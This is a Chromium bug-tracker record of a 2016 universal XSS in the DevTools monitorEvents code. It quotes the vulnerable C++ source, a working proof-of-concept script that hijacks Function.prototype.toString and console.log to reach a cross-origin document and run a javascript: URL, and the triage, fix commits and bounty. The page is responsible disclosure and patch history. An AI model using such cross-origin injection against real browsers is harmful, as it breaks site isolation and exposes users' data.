# Security: Universal XSS using ThreadDebugger::setMonitorEventsCallback

| Field | Value |
|-------|-------|
| **Issue ID** | [40085143](https://issues.chromium.org/issues/40085143) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Platform>DevTools |
| **Reporter** | se...@gmail.com |
| **Assignee** | ko...@chromium.org |
| **Created** | 2016-08-17 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

src/third\_party/WebKit/Source/core/inspector/ThreadDebugger.cpp:182:  

static void createFunctionPropertyWithData(v8::Local[v8::Context](javascript:void(0);) context, v8::Local[v8::Object](javascript:void(0);) object, const char\* name, v8::FunctionCallback callback, v8::Local[v8::Value](javascript:void(0);) data, const char\* description)  

{  

v8::Local[v8::String](javascript:void(0);) funcName = v8String(context->GetIsolate(), name);  

v8::Local[v8::Function](javascript:void(0);) func;  

if (!v8::Function::New(context, callback, data, 0, v8::ConstructorBehavior::kThrow).ToLocal(&func))  

return;  

func->SetName(funcName);  

v8::Local[v8::String](javascript:void(0);) returnValue = v8String(context->GetIsolate(), description);  

v8::Local[v8::Function](javascript:void(0);) toStringFunction;  

if (v8::Function::New(context, returnDataCallback, returnValue, 0, v8::ConstructorBehavior::kThrow).ToLocal(&toStringFunction))  

func->Set(v8String(context->GetIsolate(), "toString"), toStringFunction);  

if (!object->Set(context, funcName, func).FromMaybe(false))  

return;  

}

[...]

void ThreadDebugger::setMonitorEventsCallback(const v8::FunctionCallbackInfo[v8::Value](javascript:void(0);)& info, bool enabled)  

{  

EventTarget\* eventTarget = firstArgumentAsEventTarget(info);  

if (!eventTarget)  

return;  

Vector<String> types = normalizeEventTypes(info);  

EventListener\* eventListener = V8EventListenerList::getEventListener(ScriptState::current(info.GetIsolate()), v8::Local[v8::Function](javascript:void(0);)::Cast(info.Data()), false, enabled ? ListenerFindOrCreate : ListenerFindOnly);  

if (!eventListener)  

return;  

for (size\_t i = 0; i < types.size(); ++i) {  

if (enabled)  

eventTarget->addEventListener(AtomicString(types[i]), eventListener, false);  

else  

eventTarget->removeEventListener(AtomicString(types[i]), eventListener, false);  

}  

}

There is no access check on |eventTarget| in |setMonitorEventsCallback()|, and blink::DOMWindow  

inherits from blink::EventTarget, so it is possible to add event listeners to a cross-origin  

window. The attached listener's code is |function(e) { console.log(e.type, e); }|, therefore we  

can redefine |console.log()| and steal a cross-origin Event object.  

The repro defines the "toString" setter on Function.prototype to obtain a reference to |monitorEvents()|  

because |createFunctionPropertyWithData()| calls |Set("toString", ...)| on created functions.

**VERSION**  

Google Chrome 54.0.2824.0 (Official Build) dev-m (64-bit)  

Google Chrome 54.0.2831.0 (Official Build) canary (64-bit)  

Stable is not affected.

**REPRODUCTION CASE**  

This bug requires a higher amount of user interaction than <https://crbug.com/chromium/637594>, the repro works when you open  

the DevTools and start typing something in the DevTools Console.

<script>
frame = document.documentElement.appendChild(document.createElement("iframe"));
frame.src = "https://www.google.com/intl/ru/ads/";
var func;
funcToString = Function.prototype.toString;
Object.defineProperty(Function.prototype, "toString", {
get: () => funcToString,
set: function () {
if (this.name == "monitorEvents")
func = this;
}
});
frame.onload = () => {
interval = setInterval(() => {
if (!func)
return;
clearInterval(interval);
console.log = (t, e) => {
getProp = e.\_\_proto\_\_.\_\_proto\_\_.\_\_proto\_\_.constructor.getOwnPropertyDescriptor;
doc = getProp(frame.contentWindow, "document").value;
anchor = doc.createElement("a");
anchor.href = "javascript:alert(location)";
anchor.click();
};
func(frame.contentWindow);
}, 100);
}
</script>

--

I would like to remain anonymous for this report.

## Timeline

### ji...@chromium.org (2016-08-17)

I'm not very familiar with this part of code, but I feel the friction is too high to make an effective attack using this. 

+dgozman@, what do you think (since you're the owner of this file)? Thanks!

### dg...@chromium.org (2016-08-18)

I think this is a valid concern. Not sure what one can do with event listener from different context, but we should definitely fix the problem.
This is M54 only.

### ji...@chromium.org (2016-08-19)

[Empty comment from Monorail migration]

### ji...@chromium.org (2016-08-19)

[Empty comment from Monorail migration]

[Monorail components: Platform>DevTools]

### sh...@chromium.org (2016-08-20)

This issue is a security regression. If you are not able to fix this quickly, please revert the change that introduced it.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2016-08-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/149d9e717953a1979d186a99ef7075e184253bd7

commit 149d9e717953a1979d186a99ef7075e184253bd7
Author: kozyatinskiy <kozyatinskiy@chromium.org>
Date: Wed Aug 24 03:22:23 2016

[DevTools] Improve ConsoleAPI functions string description

BUG=638742
R=dgozman@chromium.org

Review-Url: https://codereview.chromium.org/2269843002
Cr-Commit-Position: refs/heads/master@{#413968}

[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/core/inspector/MainThreadDebugger.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/core/inspector/ThreadDebugger.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/core/inspector/ThreadDebugger.h
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/InjectedScript.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/InjectedScript.h
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/InspectedContext.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/V8Debugger.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/V8InjectedScriptHost.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.cpp
[modify] https://crrev.com/149d9e717953a1979d186a99ef7075e184253bd7/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.h


### ko...@chromium.org (2016-08-24)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-08-24)

+ awhalley@ whether to take this merge in for next week early stable release or not. Please note that this change didn't make it to last night canary so not baked in Canary/Beta yet.

### aw...@chromium.org (2016-08-24)

kozyatinskiy@ - https://crbug.com/chromium/638742#c2 and Security_Impact-Head suggests this isn't a problem in M53; am I missing something since you added the Merge-Request-53 label?  Thanks!

### ko...@chromium.org (2016-08-24)

It needs more user interaction on M-53 but it's still possible to steal cross-origin Event object if custom formatters is enabled in DevTools.

### ko...@chromium.org (2016-08-24)

In original report attacker redefines console.log to get event object, in M-53 they can define custom formatter that will be called with event object.
Custom Formatters should be enabled in DevTools settings and is disabled by default.

### di...@chromium.org (2016-08-25)

[Automated comment] Less than 2 weeks to go before stable on M53, manual review required.

### sh...@chromium.org (2016-08-25)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2016-08-25)

Thanks!  I'll request merge to M53 once this has been in ToT for 48 hours.

### sh...@chromium.org (2016-08-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-26)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-08-26)

[Automated comment] Less than 2 weeks to go before stable on M53, manual review required.

### go...@chromium.org (2016-08-26)

Approving merge to M53 branch 2785 based on #16. Please merge ASAP. Merge has to happen before 4:00 PM PT Monday (08/29) in order to make into the desktop Stable final build cut.Thank you.

### bu...@chromium.org (2016-08-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c988de4531f6e02cc5d4d7167243f84f8ac17010

commit c988de4531f6e02cc5d4d7167243f84f8ac17010
Author: Alexey Kozyatinskiy <kozyatinskiy@chromium.org>
Date: Fri Aug 26 23:31:33 2016

[DevTools] Improve ConsoleAPI functions string description

BUG=638742
R=dgozman@chromium.org
TBR=dgozman@chromium.org
Review-Url: https://codereview.chromium.org/2269843002/
Cr-Commit-Position: refs/heads/master@{#413968}
(cherry picked from commit 149d9e717953a1979d186a99ef7075e184253bd7)

Review URL: https://codereview.chromium.org/2280993003 .

Cr-Commit-Position: refs/branch-heads/2785@{#769}
Cr-Branched-From: 68623971be0cfc492a2cb0427d7f478e7b214c24-refs/heads/master@{#403382}

[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/core/inspector/MainThreadDebugger.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/core/inspector/ThreadDebugger.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/core/inspector/ThreadDebugger.h
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/InjectedScript.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/InjectedScript.h
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/V8Console.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/V8DebuggerImpl.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/V8InjectedScriptHost.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.cpp
[modify] https://crrev.com/c988de4531f6e02cc5d4d7167243f84f8ac17010/third_party/WebKit/Source/platform/v8_inspector/V8ValueCopier.h


### aw...@chromium.org (2016-09-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-08)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

The panel decided to award $2,000 for this one.  Great report but quite heavily mitigated.

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### is...@google.com (2019-02-21)

This issue was migrated from crbug.com/chromium/638742?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085143)*
